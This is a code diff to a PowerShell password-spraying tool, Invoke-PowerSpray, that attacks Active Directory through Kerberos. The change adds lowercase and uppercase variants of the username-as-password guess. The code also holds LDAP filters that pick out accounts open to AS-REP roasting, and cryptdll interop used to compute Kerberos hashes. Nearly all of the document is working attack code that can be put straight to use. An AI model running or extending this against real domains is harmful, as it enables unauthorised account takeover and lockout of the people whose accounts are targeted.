@@ -19,7 +19,7 @@ Function Invoke-PowerSpray {
     Specifies a file containing a list of usernames to send the AS-REQ for.
 
 .PARAMETER UserAsPassword
-    Specifies username as password for each authentication attempt.
+    Specifies username as password for each authentication attempt (default case, lowercase or uppercase).
 
 .PARAMETER Password
     Specifies the password for authentication attempts.
@@ -56,7 +56,7 @@ Function Invoke-PowerSpray {
     Specifies the jitter (0-1.0) to any specified delay, defaults to +/- 0.3.
 
 .PARAMETER Threads
-    Specifies the number of threads to use for authentication attempts, defaults to 2.
+    Specifies the number of threads to use for authentication attempts, defaults to 1.
 
 .PARAMETER BloodHound
     Enables Bloodhound integration to identify path to high value targets.
@@ -96,7 +96,8 @@ Function Invoke-PowerSpray {
         [String]
         $UserFile,
 
-        [Switch]
+        [ValidateSet('default', 'lowercase', 'uppercase')]
+        [String]
         $UserAsPassword,
 
         [String]
@@ -140,7 +141,7 @@ Function Invoke-PowerSpray {
 
         [Int]
         [ValidateRange(1, 100)]
-        $Threads = 2,
+        $Threads = 1,
 
         [Switch]
         $BloodHound,
@@ -229,9 +230,19 @@ Function Invoke-PowerSpray {
                 Write-Error "$($username)@$($domain) does not exist" -ErrorAction Stop
             }
         }
-        if ($UserAsPassword) {
-            $pass = $Username
+        if ($PSBoundParameters.ContainsKey('UserAsPassword')) {
             $nthash = $null
+            switch ($UserAsPassword) {
+                lowercase {
+                    $pass = $Username.ToLower()
+                }
+                uppercase {
+                    $pass = $Username.ToUpper()
+                }
+                default {
+                    $pass = $Username
+                }
+            }
         }
         $cred = [pscustomobject] @{Domain = $domain; Username = $Username; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
         $credentials.add($cred) | Out-Null
@@ -249,9 +260,19 @@ Function Invoke-PowerSpray {
                 }
             }
             if ($user -or -not $Ldap) {
-                if ($UserAsPassword) {
-                    $pass = $username
+                if ($PSBoundParameters.ContainsKey('UserAsPassword')) {
                     $nthash = $null
+                    switch ($UserAsPassword) {
+                        lowercase {
+                            $pass = $username.ToLower()
+                        }
+                        uppercase {
+                            $pass = $username.ToUpper()
+                        }
+                        default {
+                            $pass = $username
+                        }
+                    }
                 }
                 $cred = [pscustomobject] @{Domain = $domain; Username = $username; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
                 $credentials.add($cred) | Out-Null
@@ -278,9 +299,19 @@ Function Invoke-PowerSpray {
                 }
                 if ($user -or -not $Ldap) {
                     $nthash = $dump[3]
-                    if ($UserAsPassword) {
-                        $pass = $user.samAccountName
+                    if ($PSBoundParameters.ContainsKey('UserAsPassword')) {
                         $nthash = $null
+                        switch ($UserAsPassword) {
+                            lowercase {
+                                $pass = $username.ToLower()
+                            }
+                            uppercase {
+                                $pass = $username.ToUpper()
+                            }
+                            default {
+                                $pass = $username
+                            }
+                        }
                     }
                     $cred = [pscustomobject] @{Domain = $domain; Username = $username; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
                     $credentials.add($cred) | Out-Null
@@ -294,7 +325,7 @@ Function Invoke-PowerSpray {
         foreach($userAccountControl in $disabledUserAccountControl) {
             $filter += "(!userAccountControl:1.2.840.113556.1.4.803:=$userAccountControl)"
         }
-        if (-not ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash') -or $UserAsPassword)) {
+        if (-not ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash') -or $PSBoundParameters.ContainsKey('UserAsPassword'))) {
             # Find all enabled users without kerberos preauthentication enabled (AS-REP roasting)
             $filter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)$filter)"
             $users = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential
@@ -308,9 +339,19 @@ Function Invoke-PowerSpray {
             $users = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential
         }
         foreach ($user in $users) {
-            if ($UserAsPassword) {
-                $pass = $user.samAccountName
+            if ($PSBoundParameters.ContainsKey('UserAsPassword')) {
                 $nthash = $null
+                switch ($UserAsPassword) {
+                    lowercase {
+                        $pass = $user.samAccountName.ToLower()
+                    }
+                    uppercase {
+                        $pass = $user.samAccountName.ToUpper()
+                    }
+                    default {
+                        $pass = $user.samAccountName
+                    }
+                }
             }
             $cred = [pscustomobject] @{Domain = $domain; Username = $user.samAccountName; Password = $pass; NTHash = $nthash; BadPwdCount = $user.badPwdCount}
             $credentials.add($cred) | Out-Null
@@ -336,6 +377,7 @@ Function Invoke-PowerSpray {
         Neo4jPort = $Neo4jPort
         Verbose = $VerbosePreference
     }
+
     if ($PSBoundParameters['Delay'] -or $credentials.Count -eq 1) {
         New-KerberosSpray @params -Collection $credentials
     }
@@ -842,12 +884,12 @@ Function Local:KerberosPasswordHash {
         $Count = 4096
     )
 
-    $KERB_ECRYPT = [Win32+KERB_ECRYPT]
-    $UNICODE_STRING = [Win32+UNICODE_STRING]
+    $KERB_ECRYPT = [PowerSpray.Win32+KERB_ECRYPT]
+    $UNICODE_STRING = [PowerSpray.Win32+UNICODE_STRING]
 
     $kerbEcryptSize = [Runtime.InteropServices.Marshal]::SizeOf([Type]$KERB_ECRYPT)
     $pCSystemPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($kerbEcryptSize)
-    $status = [Win32]::CDLocateCSystem($eType, [ref]$pCSystemPtr)
+    $status = [PowerSpray.Win32]::CDLocateCSystem($eType, [ref]$pCSystemPtr)
     if ($status -ne 0) {
         throw New-Object ComponentModel.Win32Exception -ArgumentList ($status, "Error on CDLocateCSystem")
     }
@@ -887,11 +929,11 @@ Function Local:KerberosEncrypt {
         $data
     )
 
-    $KERB_ECRYPT = [Win32+KERB_ECRYPT]
+    $KERB_ECRYPT = [PowerSpray.Win32+KERB_ECRYPT]
 
     $kerbEcryptSize = [Runtime.InteropServices.Marshal]::SizeOf([Type]$KERB_ECRYPT)
     $pCSystemPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($kerbEcryptSize)
-    $status = [Win32]::CDLocateCSystem($eType, [ref]$pCSystemPtr)
+    $status = [PowerSpray.Win32]::CDLocateCSystem($eType, [ref]$pCSystemPtr)
     if ($status -ne 0) {
         throw New-Object ComponentModel.Win32Exception -ArgumentList ($status, "Error on CDLocateCSystem")
     }
@@ -1221,52 +1263,54 @@ using System;
 using System.ComponentModel;
 using System.Runtime.InteropServices;
 
-public class Win32 {
-    [DllImport("cryptdll.dll", CharSet = CharSet.Auto, SetLastError = false)]
-    public static extern int CDLocateCSystem(UInt32 type, out IntPtr pCheckSum);
+namespace PowerSpray {
+    public class Win32 {
+        [DllImport("cryptdll.dll", CharSet = CharSet.Auto, SetLastError = false)]
+        public static extern int CDLocateCSystem(UInt32 type, out IntPtr pCheckSum);
 
-    [StructLayout(LayoutKind.Sequential)]
-    public struct UNICODE_STRING : IDisposable {
-        public ushort Length;
-        public ushort MaximumLength;
-        public IntPtr buffer;
+        [StructLayout(LayoutKind.Sequential)]
+        public struct UNICODE_STRING : IDisposable {
+            public ushort Length;
+            public ushort MaximumLength;
+            public IntPtr buffer;
 
-        public UNICODE_STRING(string s) {
-            Length = (ushort)(s.Length * 2);
-            MaximumLength = (ushort)(Length + 2);
-            buffer = Marshal.StringToHGlobalUni(s);
+            public UNICODE_STRING(string s) {
+                Length = (ushort)(s.Length * 2);
+                MaximumLength = (ushort)(Length + 2);
+                buffer = Marshal.StringToHGlobalUni(s);
+            }
+
+            public void Dispose() {
+                Marshal.FreeHGlobal(buffer);
+                buffer = IntPtr.Zero;
+            }
+
+            public override string ToString() {
+                return Marshal.PtrToStringUni(buffer);
+            }
         }
 
-        public void Dispose() {
-            Marshal.FreeHGlobal(buffer);
-            buffer = IntPtr.Zero;
+        [StructLayout(LayoutKind.Sequential)]
+        public struct KERB_ECRYPT {
+            int Type0;
+            public int BlockSize;
+            int Type1;
+            public int KeySize;
+            public int Size;
+            int unk2;
+            int unk3;
+            public IntPtr AlgName;
+            public IntPtr Initialize;
+            public IntPtr Encrypt;
+            public IntPtr Decrypt;
+            public IntPtr Finish;
+            public IntPtr HashPassword;
+            IntPtr RandomKey;
+            IntPtr Control;
+            IntPtr unk0_null;
+            IntPtr unk1_null;
+            IntPtr unk2_null;
         }
-
-        public override string ToString() {
-            return Marshal.PtrToStringUni(buffer);
-        }
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct KERB_ECRYPT {
-        int Type0;
-        public int BlockSize;
-        int Type1;
-        public int KeySize;
-        public int Size;
-        int unk2;
-        int unk3;
-        public IntPtr AlgName;
-        public IntPtr Initialize;
-        public IntPtr Encrypt;
-        public IntPtr Decrypt;
-        public IntPtr Finish;
-        public IntPtr HashPassword;
-        IntPtr RandomKey;
-        IntPtr Control;
-        IntPtr unk0_null;
-        IntPtr unk1_null;
-        IntPtr unk2_null;
     }
 }
 "@
